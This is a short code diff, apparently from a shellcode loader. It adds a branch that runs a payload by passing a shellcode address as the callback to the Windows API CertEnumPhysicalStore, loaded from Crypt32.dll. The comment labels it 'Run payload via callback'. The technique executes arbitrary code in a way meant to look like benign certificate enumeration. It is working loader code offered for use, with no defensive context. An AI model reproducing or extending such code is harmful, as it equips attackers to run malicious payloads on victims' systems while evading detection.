@@ -51,7 +51,22 @@ int entry(int argc, char** argv) {
 #endif
 
     // Run payload via callback
-#ifdef EXEC_CERTENUMSYSTEMSTORE
+#ifdef EXEC_CERTENUMPHYSICALSTORE
+    /* #include <wincrypt.h> */
+    typedef bool (__cdecl* MYPROC)(const void*, DWORD, void*, void*);
+
+    HMODULE lib = LoadLibrary("Crypt32.dll");
+    if (lib != NULL) {
+        MYPROC CertEnumPhysicalStore = (MYPROC) GetProcAddress(
+            lib, "CertEnumPhysicalStore"
+        );
+        if (CertEnumPhysicalStore != NULL) {
+            CertEnumPhysicalStore(
+                L"My", CERT_SYSTEM_STORE_CURRENT_USER, 0, scAddr
+            );
+        }
+    }
+#elifdef EXEC_CERTENUMSYSTEMSTORE
     // NOTE: potentially dangerous, runs numerous times
     /* #include <wincrypt.h> */
     typedef bool (__cdecl* MYPROC)(DWORD, void*, void*, void*);
